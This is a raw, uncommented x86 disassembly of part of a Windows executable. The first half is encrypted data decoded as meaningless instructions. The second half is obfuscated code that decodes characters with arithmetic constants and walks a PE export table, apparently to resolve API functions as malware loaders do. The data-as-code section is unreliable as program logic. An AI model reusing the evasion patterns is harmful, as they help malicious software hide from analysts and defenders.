  40fe4c:	lods   al,BYTE PTR ds:[esi]
  40fe4d:	clc    
  40fe4e:	fld    TBYTE PTR [edi-0x635717a0]
  40fe54:	sbb    ah,BYTE PTR [ecx+0x5f8b8ba5]
  40fe5a:	mov    BYTE PTR [eax+0x6328993f],0x9c
  40fe61:	add    al,0x22
  40fe63:	adc    al,0x19
  40fe65:	cli    
  40fe66:	and    al,0x97
  40fe68:	mov    al,0xcb
  40fe6a:	xchg   esp,eax
  40fe6b:	xor    al,0x4e
  40fe6d:	stos   BYTE PTR es:[edi],al
  40fe6e:	fld    QWORD PTR [esi+esi*2-0x33]
  40fe72:	fstp   TBYTE PTR [ecx+0x58]
  40fe75:	fld    DWORD PTR [ecx]
  40fe77:	test   al,0x7e
  40fe79:	xor    DWORD PTR [edx+0xc],eax
  40fe7c:	out    0xb6,al
  40fe7e:	lahf   
  40fe7f:	sub    BYTE PTR [edi+0x3c],dl
  40fe82:	jbe    0x40fe50
  40fe84:	in     al,0xb6
  40fe86:	and    esp,DWORD PTR [edx]
  40fe88:	(bad)
  40fe8c:	and    esp,eax
  40fe8e:	and    edx,eax
  40fe90:	shr    esi,1
  40fe92:	mov    ebx,0x6a8fd855
  40fe97:	(bad)  
  40fe98:	call   0x14a6345
  40fe9d:	dec    esp
  40fe9e:	xchg   esp,eax
  40fe9f:	pop    esp
  40fea0:	sub    dh,cl
  40fea2:	ss leave 
  40fea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fea5:	xor    dh,BYTE PTR [ecx-0x3]
  40fea8:	jo     0x40fe8a
  40feaa:	ret    
  40feab:	add    dh,BYTE PTR [ecx+ebp*2-0x74ef1cdf]
  40feb2:	and    al,BYTE PTR [esi-0xf]
  40feb5:	cmc    
  40feb6:	mov    cl,ch
  40feb8:	push   0x21fd0ee1
  40febd:	lds    si,DWORD PTR [esi-0x32]
  40fec1:	nop
  40fec2:	or     DWORD PTR [edx],esp
  40fec4:	aam    0x39
  40fec6:	cwde   
  40fec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fec8:	mov    eax,0x73a94b5
  40fecd:	test   eax,ebx
  40fecf:	in     eax,0x8
  40fed1:	push   ebp
  40fed2:	inc    ebp
  40fed3:	adc    eax,0x304836af
  40fed8:	xchg   ebx,eax
  40fed9:	cmp    bl,BYTE PTR [edx]
  40fedb:	in     al,0xba
  40fedd:	cmp    DWORD PTR [ebp+ebp*4+0x24],0x7797386a
  40fee5:	xchg   esp,eax
  40fee6:	lds    edi,FWORD PTR [edx-0x10d320a1]
  40feec:	cwde   
  40feed:	mov    ?,WORD PTR [ebx]
  40feef:	xor    DWORD PTR [ebx-0x9ebc143],0x7aed636a
  40fef9:	add    al,0x7c
  40fefb:	icebp  
  40fefc:	adc    eax,0xd89db664
  40ff01:	lods   al,BYTE PTR ds:[esi]
  40ff02:	dec    eax
  40ff03:	xor    dh,BYTE PTR [edi-0x3c]
  40ff06:	(bad)  
  40ff07:	sbb    eax,0xe8855c8e
  40ff0c:	shl    BYTE PTR ds:0xda629bc1,cl
  40ff12:	mov    ds:0xf1e9fdb9,al
  40ff17:	ss inc ebx
  40ff19:	add    BYTE PTR [eax],bh
  40ff1b:	and    al,0xb6
  40ff1d:	call   0xc295:0xbae486e
  40ff24:	mov    ebp,?
  40ff26:	outs   dx,DWORD PTR ds:[esi]
  40ff27:	push   esi
  40ff28:	cld    
  40ff29:	fs adc eax,edx
  40ff2c:	mov    BYTE PTR [ebx+0x52617142],bl
  40ff32:	inc    ebx
  40ff33:	ret    0xd851
  40ff36:	sub    dh,dl
  40ff38:	(bad)  
  40ff3a:	rcr    esp,cl
  40ff3c:	mov    ebp,0xe9d63bc3
  40ff41:	sar    edi,1
  40ff43:	pop    es
  40ff44:	test   bh,0x43
  40ff47:	ficom  DWORD PTR [ebx-0x2ffbdea2]
  40ff4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff4f:	jnp    0x40ff63
  40ff51:	jae    0x40ff66
  40ff53:	sti    
  40ff54:	add    DWORD PTR [edi+0x6cba994d],edx
  40ff5a:	mov    ecx,0xfaba4f1
  40ff5f:	sar    bl,cl
  40ff61:	mov    dh,0xf4
  40ff63:	adc    DWORD PTR [eax+0x631c246b],edi
  40ff69:	jbe    0x40ffe0
  40ff6b:	add    DWORD PTR [edx-0x31f238f8],ebp
  40ff71:	jl     0x40ff4f
  40ff73:	mov    ds:0x4d9968d4,al
  40ff78:	dec    edx
  40ff79:	mov    ds:0xb21734a3,eax
  40ff7e:	icebp  
  40ff7f:	dec    edi
  40ff80:	pop    esi
  40ff81:	mov    ah,0x3e
  40ff83:	xlat   BYTE PTR ss:[ebx]
  40ff85:	arpl   WORD PTR [ebp-0x62],bp
  40ff88:	rcl    DWORD PTR [eax+0x7b691de6],0xaa
  40ff8f:	mov    esp,db2
  40ff92:	ds call 0xe6d:0x2e7adcd3
  40ff9a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40ff9c:	jnp    0x40ff7d
  40ff9e:	fwait
  40ff9f:	cmc    
  40ffa0:	in     al,0xc2
  40ffa2:	fsub   DWORD PTR [ebx+0x5c]
  40ffa5:	and    ch,BYTE PTR [edi+0x6831cf03]
  40ffab:	hlt    
  40ffac:	pop    eax
  40ffad:	ds inc esp
  40ffaf:	icebp  
  40ffb0:	dec    ebx
  40ffb1:	push   es
  40ffb2:	push   0x9222a09e
  40ffb7:	xchg   ebp,eax
  40ffb8:	and    DWORD PTR [ebp-0x9fd68de],ecx
  40ffbe:	int    0xf6
  40ffc0:	leave  
  40ffc1:	xchg   ebx,eax
  40ffc2:	sub    ch,BYTE PTR [edx+0x55]
  40ffc5:	addr16 inc edi
  40ffc7:	scas   eax,DWORD PTR es:[edi]
  40ffc8:	push   edi
  40ffc9:	cli    
  40ffca:	bound  eax,QWORD PTR [edx+ebp*8]
  40ffcd:	out    0x59,eax
  40ffcf:	xor    BYTE PTR [ebx],0x1c
  40ffd2:	xchg   ecx,eax
  40ffd3:	or     eax,0xb3155d74
  40ffd8:	mov    ebp,0x80843471
  40ffdd:	(bad)  
  40ffde:	sub    BYTE PTR [ebp+0x49],bl
  40ffe1:	pop    eax
  40ffe2:	dec    esp
  40ffe3:	aad    0x69
  40ffe5:	jbe    0x40ffdb
  40ffe7:	je     0x40ff95
  40ffe9:	push   0xffffffb2
  40ffeb:	sbb    bh,BYTE PTR [esi]
  40ffed:	fucomi st,st(2)
  40ffef:	cmp    ah,dh
  40fff1:	fld    QWORD PTR [eax]
  40fff3:	popa   
  40fff4:	mov    al,ds:0x6661c471
  40fff9:	jecxz  0x40ff85
  40fffb:	or     ebp,DWORD PTR [edi-0x57]
  40fffe:	int3   
  40ffff:	and    al,0xc3
  410001:	cmp    DWORD PTR ds:0xeae166e8,edx
  410007:	mov    cl,0xc2
  410009:	call   DWORD PTR [edx-0x76]
  41000c:	test   al,dh
  41000e:	rcr    DWORD PTR [edx+esi*1+0x61e952c3],0x7a
  410016:	inc    esp
  410017:	jmp    0x36fc:0x3f7dd496
  41001e:	sub    DWORD PTR [ecx+edx*1],0x73bac995
  410025:	stos   BYTE PTR es:[edi],al
  410026:	xor    ch,ah
  410028:	mov    eax,ds:0x9f9b345c
  41002d:	mov    al,ds:0x96c295c9
  410032:	jo     0x4100a5
  410034:	lds    esi,FWORD PTR [edi+0x211adde]
  41003a:	iret   
  41003b:	stc    
  41003c:	fidivr DWORD PTR [esi+0x51]
  41003f:	mov    bh,0xb4
  410041:	ret    0xe045
  410044:	(bad)  
  410045:	retf   
  410046:	or     BYTE PTR [ebx-0x3d],dh
  410049:	xlat   BYTE PTR ds:[ebx]
  41004a:	std    
  41004b:	mov    ch,0x84
  41004d:	mov    eax,0x86798f52
  410052:	aad    0x19
  410054:	out    0x79,eax
  410056:	scas   eax,DWORD PTR es:[edi]
  410057:	push   0xf67a896b
  41005c:	(bad)  
  41005d:	fisub  DWORD PTR [ebx]
  41005f:	pop    ss
  410060:	into   
  410061:	inc    ebx
  410062:	jnp    0x410051
  410064:	aas    
  410065:	stos   DWORD PTR es:[edi],eax
  410066:	inc    edi
  410067:	mov    al,ds:0xecd5118f
  41006c:	aam    0xe9
  41006e:	mov    dl,0x3a
  410070:	mov    bh,0x35
  410072:	jle    0x410054
  410074:	inc    eax
  410075:	es jno 0x40fff8
  410078:	outs   dx,BYTE PTR ds:[esi]
  410079:	jle    0x410003
  41007b:	ret    
  41007c:	inc    eax
  41007d:	add    esi,edi
  41007f:	and    BYTE PTR [ebp-0x5e462b51],bh
  410085:	or     bl,BYTE PTR [ebx]
  410087:	inc    ecx
  410088:	adc    ch,BYTE PTR [edx+0x1f4f1672]
  41008e:	push   eax
  41008f:	jnp    0x410083
  410091:	aam    0xc9
  410093:	ret    
  410094:	and    BYTE PTR ds:0xfa8c9f4,dl
  41009a:	nop
  41009b:	data16 jg 0x4100f8
  41009e:	and    BYTE PTR [esi+edx*8],al
  4100a1:	test   dh,0x83
  4100a4:	mov    ecx,0x4fec263d
  4100a9:	push   ebx
  4100aa:	jg     0x4100d5
  4100ac:	les    ebp,FWORD PTR [eax-0x76]
  4100af:	cmp    dl,BYTE PTR [ecx+0x22bd12ef]
  4100b5:	jmp    0x4100c4
  4100b7:	test   eax,0xcfd25fdf
  4100bc:	sub    eax,0x21f9d1ec
  4100c1:	fnsave [ebp-0x1dacacb1]
  4100c7:	addr16 inc edx
  4100c9:	ror    edi,cl
  4100cb:	inc    edx
  4100cc:	xchg   ebx,eax
  4100cd:	jge    0x410124
  4100cf:	shl    ebp,1
  4100d1:	mov    bh,0x7d
  4100d3:	adc    al,0x72
  4100d5:	pop    esp
  4100d6:	cdq    
  4100d7:	pop    ss
  4100d8:	rcr    BYTE PTR [eax],1
  4100da:	inc    ebx
  4100db:	push   esp
  4100dc:	or     DWORD PTR ds:0x7476f7bb,ebp
  4100e2:	push   ss
  4100e3:	mov    esi,0x8c1eb2b
  4100e8:	enter  0x32a1,0xf1
  4100ec:	loopne 0x41016c
  4100ee:	mov    ecx,0x20754af0
  4100f3:	ret    
  4100f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100f5:	mov    esp,0xa859d64e
  4100fa:	je     0x4100fa
  4100fc:	sbb    al,0xb1
  4100fe:	retf   0xc4d
  410101:	fisttp WORD PTR [edi+0x599f6cc2]
  410107:	ins    BYTE PTR es:[edi],dx
  410108:	sbb    bh,BYTE PTR ds:0x9bc7e09d
  41010e:	mov    ds:0xc8c0d60c,eax
  410113:	iret   
  410114:	loop   0x410171
  410116:	sub    ah,ah
  410118:	xlat   BYTE PTR ds:[ebx]
  410119:	and    ebp,esp
  41011b:	out    0x2c,al
  41011d:	outs   dx,DWORD PTR ds:[esi]
  41011e:	je     0x41014b
  410120:	call   0x95eb:0xa276b9c0
  410127:	ins    DWORD PTR es:[edi],dx
  410128:	jmp    0x54302a73
  41012d:	sub    BYTE PTR [ecx],0x96
  410130:	in     eax,dx
  410131:	jl     0x41016f
  410133:	mov    cl,0x3a
  410135:	fcom   st(4)
  410137:	add    BYTE PTR [eax],bh
  410139:	push   ss
  41013a:	lods   eax,DWORD PTR ds:[esi]
  41013b:	pop    ds
  41013c:	inc    edx
  41013d:	dec    edx
  41013e:	xchg   edi,eax
  41013f:	inc    ebx
  410140:	cmp    al,BYTE PTR [edi-0x2d078454]
  410146:	jmp    0x4100e3
  410148:	es cmp esi,edx
  41014b:	fild   WORD PTR [edi-0x33884a4]
  410151:	outs   dx,DWORD PTR ds:[esi]
  410152:	pop    esp
  410153:	mov    ebx,0xe079ac31
  410159:	(bad)  
  41015a:	mov    dl,0xc6
  41015c:	mov    al,ds:0x3d2d8241
  410161:	in     al,dx
  410162:	les    esi,FWORD PTR [eax+0x2f]
  410165:	or     eax,0xbca4d646
  41016a:	cs jbe 0x4100ef
  41016d:	dec    ecx
  41016e:	ror    esi,0xb5
  410171:	cvtpi2ps xmm7,mm5
  410174:	imul   edi,DWORD PTR [esp+ebp*8+0x71],0x7d
  410179:	ja     0x4101d2
  41017b:	shl    esp,0xac
  41017e:	call   0x2993:0x83e05704
  410185:	push   ebp
  410186:	xchg   esi,eax
  410187:	sub    al,0x24
  410189:	imul   BYTE PTR [ebx]
  41018b:	out    dx,eax
  41018c:	pop    ebx
  41018d:	hlt    
  41018e:	out    dx,eax
  41018f:	jp     0x4101aa
  410191:	ret    
  410192:	call   0xd304:0xda18f748
  410199:	gs gs ins BYTE PTR es:[edi],dx
  41019c:	nop
  41019d:	adc    eax,0x16d6b7cf
  4101a2:	cli    
  4101a3:	xchg   edx,eax
  4101a4:	xchg   edx,eax
  4101a5:	stc    
  4101a6:	dec    ebx
  4101a7:	scas   al,BYTE PTR es:[edi]
  4101a8:	inc    ebp
  4101a9:	bound  esi,QWORD PTR [eax]
  4101ab:	push   esi
  4101ac:	mov    eax,ds:0x4e1b868
  4101b1:	mov    dh,0x6
  4101b3:	or     eax,0xa39a97d9
  4101b8:	add    al,0xd0
  4101ba:	(bad)  
  4101bb:	sub    dl,BYTE PTR [eax-0x4d8596bb]
  4101c1:	jle    0x410186
  4101c3:	retf   0xf722
  4101c6:	jmp    0x33d6ee7e
  4101cb:	sub    dl,BYTE PTR [esi+0x6a70d33c]
  4101d1:	mov    ecx,0x63066122
  4101d6:	mov    BYTE PTR [edi-0x49],bh
  4101d9:	pusha  
  4101da:	ret    
  4101db:	jmp    0x2d8a:0xa44383ac
  4101e2:	fs ins DWORD PTR es:[edi],dx
  4101e4:	pusha  
  4101e5:	pushf  
  4101e6:	inc    edi
  4101e7:	mov    ebp,0xef937d45
  4101ec:	and    cl,dh
  4101ee:	inc    ecx
  4101ef:	lea    esp,[esi+0x33724eec]
  4101f5:	or     esp,esp
  4101f7:	sti    
  4101f8:	fdivp  st(0),st
  4101fa:	push   esi
  4101fb:	mov    ebx,0x6757eda0
  410200:	or     BYTE PTR [ebp+0x79],0xf
  410204:	mov    cl,0x90
  410206:	es pop ebx
  410208:	mov    al,0x3a
  41020a:	(bad)  
  41020c:	lock loop 0x4101b8
  41020f:	int    0x2
  410211:	push   esp
  410212:	mov    ?,WORD PTR [ebx+esi*4-0x27]
  410216:	out    dx,eax
  410217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410218:	dec    DWORD PTR [eax]
  41021a:	pop    ds
  41021b:	loope  0x410211
  41021d:	test   eax,0x8a051580
  410222:	adc    al,0x27
  410224:	adc    al,0x8c
  410226:	xchg   edi,eax
  410227:	fist   WORD PTR [ecx-0x6b]
  41022a:	push   0xd1f923da
  41022f:	pop    ds
  410230:	push   ss
  410231:	inc    edi
  410232:	push   0xffffffb7
  410234:	push   edx
  410235:	jae    0x4102a8
  410237:	rol    ecx,cl
  410239:	ds stc 
  41023b:	push   es
  41023c:	sbb    BYTE PTR [ebx],dl
  41023e:	imul   edi,ecx,0xc04e2050
  410244:	jl     0x4101e9
  410246:	ins    DWORD PTR es:[edi],dx
  410247:	push   ebp
  410248:	inc    edi
  410249:	stc    
  41024a:	adc    ch,BYTE PTR [eax+edi*8+0x3e]
  41024e:	in     al,dx
  41024f:	fisttp WORD PTR [ebx]
  410251:	pop    edx
  410252:	mov    eax,ds:0xb2cfc5e9
  410257:	inc    ecx
  410258:	scas   eax,DWORD PTR es:[edi]
  410259:	mov    esi,0xcb0280ba
  41025e:	jae    0x4102bd
  410260:	(bad)  
  410261:	adc    DWORD PTR [edi],edi
  410263:	loop   0x4102b4
  410265:	mov    DWORD PTR [esi+0x21b3bd11],ecx
  41026b:	bound  ecx,QWORD PTR [esi+0xaf2721]
  410271:	push   ebp
  410272:	jecxz  0x4102ae
  410274:	fs jl  0x4101f8
  410277:	lea    edi,ds:0xb09839be
  41027d:	or     esi,0x4caa80d8
  410283:	lahf   
  410284:	mov    ebp,0xf29cf6fb
  410289:	pop    es
  41028a:	push   edx
  41028b:	std    
  41028c:	sahf   
  41028d:	adc    al,0x42
  41028f:	mov    bl,0xb9
  410291:	push   0x358706a5
  410296:	and    BYTE PTR [edx],bh
  410298:	(bad)  
  410299:	leave  
  41029a:	(bad)  
  41029b:	or     esi,DWORD PTR [edx+0x3837105]
  4102a1:	sbb    al,0x85
  4102a3:	fisubr WORD PTR [edi]
  4102a5:	xchg   ecx,eax
  4102a6:	ds cli 
  4102a8:	sbb    ecx,DWORD PTR [edx+0x55a464c8]
  4102ae:	stc    
  4102af:	scas   al,BYTE PTR es:[edi]
  4102b0:	push   edx
  4102b1:	or     ecx,0x5f
  4102b4:	ins    BYTE PTR es:[edi],dx
  4102b5:	int3   
  4102b6:	outs   dx,DWORD PTR ds:[esi]
  4102b7:	mov    ah,0x31
  4102b9:	pop    eax
  4102ba:	rcl    dl,1
  4102bc:	cld    
  4102bd:	jne    0x41033b
  4102bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102c0:	je     0x4102bd
  4102c2:	cs pop esi
  4102c4:	sub    edx,esp
  4102c6:	inc    esi
  4102c7:	or     DWORD PTR [edx+0x11],ebx
  4102ca:	pop    DWORD PTR cs:[edx]
  4102cd:	das    
  4102ce:	inc    ecx
  4102cf:	xchg   edi,eax
  4102d0:	push   0xffffff97
  4102d2:	jmp    0x4600:0xb23220d0
  4102d9:	in     eax,0xef
  4102db:	in     eax,0x4b
  4102dd:	adc    dh,cl
  4102df:	dec    ebx
  4102e0:	lea    edi,[eax+0x6]
  4102e3:	xchg   ah,dh
  4102e5:	test   al,dh
  4102e7:	jg     0x4102bf
  4102e9:	add    al,0xa2
  4102eb:	push   ecx
  4102ec:	and    BYTE PTR [esi+0x6b2a09ce],ah
  4102f2:	fidivr DWORD PTR [edi+0x1b]
  4102f5:	adc    eax,0x7a0dba21
  4102fa:	pop    esi
  4102fb:	dec    ebx
  4102fc:	ss pushf 
  4102fe:	sahf   
  4102ff:	adc    ebp,edx
  410301:	retf   
  410302:	rol    BYTE PTR [edi-0x6b5eace7],cl
  410308:	mov    dh,0x4a
  41030a:	stos   BYTE PTR es:[edi],al
  41030b:	mov    ds:0xc2b8775e,eax
  410310:	push   ebx
  410311:	inc    ebx
  410312:	fisub  WORD PTR [esp+edx*8-0x61]
  410316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410317:	xchg   ebx,eax
  410318:	retf   
  410319:	cmp    esp,ecx
  41031b:	loopne 0x4102f6
  41031d:	pop    ebx
  41031e:	repz sub al,0x15
  410321:	sub    BYTE PTR [edx-0x47],0xbd
  410325:	jbe    0x4102ba
  410327:	jl     0x41036a
  410329:	mov    edx,0xec9784d8
  41032e:	xor    DWORD PTR gs:[edx-0x6997bca6],eax
  410335:	pop    ebx
  410336:	mov    eax,ds:0x7686d624
  41033b:	ins    DWORD PTR es:[edi],dx
  41033c:	or     DWORD PTR [eax+0xb],ebp
  41033f:	addr16 and al,0x30
  410342:	adc    al,0x2d
  410344:	(bad)  
  410345:	fistp  DWORD PTR [ebx+0x4c]
  410348:	xchg   ecx,eax
  410349:	or     DWORD PTR [esi+ebx*1+0x49cea160],esi
  410350:	aaa    
  410351:	push   0x15d422e6
  410356:	cmp    al,0x9e
  410358:	inc    dl
  41035a:	lock sub al,0xc9
  41035d:	shl    esp,0xea
  410360:	test   BYTE PTR [edi+0x8],cl
  410363:	out    0x8,al
  410365:	and    eax,0xe9ef706e
  41036a:	rcl    cl,0xb6
  41036d:	mov    ebx,0x3b4b
  410372:	sub    di,bx
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d3dc
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff82
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d4f0
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d3dc
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
